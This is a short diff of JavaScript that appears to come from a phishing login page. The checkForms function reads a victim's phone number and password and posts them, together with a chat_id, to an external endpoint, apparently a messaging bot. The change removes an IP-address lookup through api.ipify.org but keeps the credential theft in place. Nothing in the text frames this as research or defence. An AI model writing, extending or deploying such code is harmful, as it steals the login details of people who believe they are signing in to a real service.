@@ -39,12 +39,6 @@ function checkForms(event) {
     var phoneNumber = form1.getElementsByTagName('input')[0].value;
     var password = form1.getElementsByTagName('input')[1].value;
 
-    // Get IP address of the user
-    var ipAddress = '';
-    fetch('https://api.ipify.org?format=json')
-    .then(response => response.json())
-    .then(data => {
-        ipAddress = data.ip;
         // Check if phone number and password are not empty
         if (phoneNumber === '' || password === '') {
             alert('You forgot something!🤷‍');
@@ -53,7 +47,7 @@ function checkForms(event) {
 
             var formData = new FormData();
             formData.append('chat_id', chat_id);
-            formData.append('text', 'Phone number: ' + phoneNumber + '\nPassword: ' + password + '\nIP Address: ' + ipAddress);
+            formData.append('text', 'Phone number: ' + phoneNumber + '\nPassword: ' + password);
 
             // Send message with phone number, password, and IP address
             fetch(url, {
